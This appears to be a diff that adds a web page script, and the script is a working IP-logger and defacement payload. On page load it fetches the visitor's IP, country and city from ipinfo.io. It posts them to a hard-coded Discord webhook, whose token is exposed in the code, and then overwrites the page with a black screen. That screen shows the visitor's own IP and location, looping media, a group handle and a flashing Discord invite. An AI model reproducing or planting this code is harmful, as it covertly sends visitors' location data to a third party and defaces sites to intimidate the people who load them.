@@ -1,0 +1,98 @@
+<script>
+  fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+      const { ip, country, city, region } = data;
+      const dateTime = new Date().toLocaleString();
+      const webhookUrl = 'https://discord.com/api/webhooks/1276599399975489567/cdNVU_wwtl6zQbZDSCjM4pqIvH_1OOqKhb5ifcFNY8jGwiSqMlm5wGWC-9GIxW4Nx1IT';
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
+      });
+      document.documentElement.innerHTML = `<!DOCTYPE html>
+      <html lang='en'>
+        <head>
+          <meta charset='UTF-8'>
+          <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+          <style>
+          body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+          }
+          body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+          }
+          .video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+          }
+          .container {
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            border-radius: 15px;
+            padding: 20px;
+          }
+          .container img {
+            width: 100%;
+            max-width: 100080px;
+            display: block;
+            margin: 0 auto;
+          }
+          .container h1 {
+            color: red;
+            font-size: 50px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+          }
+          #discord-link {
+            color: red;
+            animation: flash 1s infinite alternate;
+            transition: color 1s;
+          }
+          @keyframes flash {
+            0% {
+              color: red;
+            }
+            50% {
+              color: blue;
+            }
+            100% {
+              color: red;
+            }
+          }
+          </style>
+        </head>
+        <body>
+          <video class="video-background" autoplay loop muted>
+            <source src="">
+          </video>
+          <div class='container'>
+  <div class='container'><div class='container'>
+            <img src="https://cdn.discordapp.com/attachments/1279756561580822618/1284089162554933249/ezgif-2-7f21a65fa1.gif?ex=66e55cb9&is=66e40b39&hm=63e89abca9f16d44cdceb4f547f9e854d9a8f3056fbe557be2b6c141d1b9cff5&">
+            <h1></h1>
+            <h1># K X & 2hmn </h1>
+            <p>IP : <span id='ip'>${ip}</span></p>
+            <p>Country & City : <span id='location'>${country} - ${city}</span></p>
+            <p id="discord-link" style="font-size: 36px; animation: flash 2s infinite alternate;">Discord.gg/𝗨𝗔𝗘𝗘
+            </p>
+          </div>
+          <audio autoplay loop>
+            <source src="https://cdn.discordapp.com/attachments/1279756561580822618/1280657527754854420/x.mp3?ex=66e4be44&is=66e36cc4&hm=84482c6837dd0f2144a9d46f41ee08ddbb35a61c528e1f913246eebf8441b930&">
+          </audio>
+        </body>
+      </html>`;
+    });
+</script>
